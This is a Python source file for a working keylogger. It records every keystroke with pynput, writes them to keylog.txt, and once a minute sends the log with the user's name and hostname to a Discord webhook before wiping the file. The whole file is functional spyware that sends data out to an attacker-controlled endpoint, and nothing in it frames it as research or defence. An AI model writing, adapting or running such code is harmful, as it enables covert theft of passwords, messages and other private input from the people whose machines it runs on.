import os
import time
import requests
import json
import socket
from pynput import keyboard

# Get the username of the currently logged-in user
username = os.getlogin()

# Get the hostname of the computer
hostname = socket.gethostname()

# Load credentials from the JSON file
with open("credentials.json", "r") as f:
    credentials = json.load(f)

# Access the Discord webhook URL
WEBHOOK_URL = credentials["discord_webhook"]["keylogger_webhook_url"]

# File to store keystrokes
LOG_FILE = "keylog.txt"

# Variable to store keystrokes
keystrokes = []

# Function to send data to Discord and clear the log file
def send_to_discord():
    try:
        print("Sending keylog data to Discord...")
        with open(LOG_FILE, "r") as file:
            data = file.read()
            if data:
                payload = {"content": f"Keylog Data (Last Minute) from {username}, hostname: {hostname}:\n```\n{data}\n```"}
                requests.post(WEBHOOK_URL, json=payload)
                print("Keylog data sent to Discord.")
                
                # Wipe the log file after sending
                open(LOG_FILE, "w").close()
                print("Log file wiped.")
    except Exception as e:
        print(f"Error sending to Discord: {e}")

# Function to handle key presses
def on_press(key):
    try:
        # Handle regular keys (e.g., letters, numbers)
        if hasattr(key, "char") and key.char is not None:
            keystrokes.append(key.char)
        else:
            # Handle special keys (e.g., space, enter, shift)
            keystrokes.append(f"[{key}]")
    except Exception as e:
        print(f"Error processing key press: {e}")

    # Write keystrokes to file
    with open(LOG_FILE, "a") as file:
        file.write("".join(keystrokes))
    keystrokes.clear()

# Start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        while True:
            time.sleep(60)  # Wait for 1 minute
            send_to_discord()

# Run the keylogger
if __name__ == "__main__":
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()
    start_keylogger()